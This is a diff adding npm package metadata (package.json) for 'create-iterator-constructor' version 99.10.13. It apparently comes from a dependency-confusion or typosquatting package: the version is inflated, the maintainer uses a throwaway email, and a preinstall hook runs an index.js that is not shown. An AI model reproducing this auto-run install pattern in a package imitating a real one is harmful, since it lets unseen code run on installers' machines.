@@ -1,0 +1,39 @@
+{
+    "name": "create-iterator-constructor",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "create-iterator-constructor@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-wk4+yC2tjaDMWyFFiPuwoJ0KepSTuPvR6Ly98TTT2rey3sVZzLxlRub6rbndkseef6cV15fxW3Bzn/r8ete9BA==",
+        "shasum": "63b3e0dcb3ddb82a78ae5aa1a729754cb5ea90a5",
+        "tarball": "https://registry.npmjs.org/create-iterator-constructor/-/create-iterator-constructor-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5085,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXrACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmp1tg/+Obr9bvPZwxLhUFdTAV9JHAMGinzZ1zhWuLE4WjwlBPNraDSg\r\neKDCiNF8kd+lyvdHmJX3rW/QmpwoYzVoXrWe4BX3Guio22dOedFZByqQuk6C\r\nx1/pGB3+pfaWmLl9fSPKtd5YjJ5EakOY3tgKHEFC1Gfswg1sdMwsp/dvKuoI\r\na/XMMRByAHDhXxd6F20XwvH+7esZ4ewk1mjuYZwq1im2O4fmKP/WTlnWX5G9\r\nSff3uWyjJHVYoVLYLjGi5MJ9V62e71tj9JFhBDSUyCpH170SPL1Y2215ZA9n\r\n8/EN2Zvc7Pvzrgmtvx2wKqe0uqPfEp/vipH6dnGtO7Ypn4TIvc6R0s5OQA5d\r\nSe9B/kdQOTGrDGp5saORobGuyTo5o7KHZB0yo8RO0JyCz1a3dLwMbP67fbjR\r\nCKGSqBC4Eu8SiFAjtEQ98nFy049rlvqyIcYf30iDRxQP2hVRPnXPq/Vz7cbF\r\nXcFPfUyFBY7vXWCgJurixWqMhr5UpqJy2/l7To9uKHAb09cTa8dNWItNG/tt\r\n8tLcSDT916a1+Agw4lGnTKHbvsX4qMMdius/tS7o9VunISXAW4BJOmd/n7Cf\r\n9tRcYXmkKO6jWoAgZkLz6QrrP9ewYCAVuLIrwTa5xDottwplUvlzcVjsjDXg\r\nijWgNpSCFN5a9ZcRdP+GiE0BthuYmx7Ez2w=\r\n=E/EF\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "pfuscqls",
+        "email": "pfuscqls@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "pfuscqls",
+            "email": "pfuscqls@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/create-iterator-constructor_99.10.13_1648420331861_0.5049576311639625"
+    },
+    "_hasShrinkwrap": false
+}
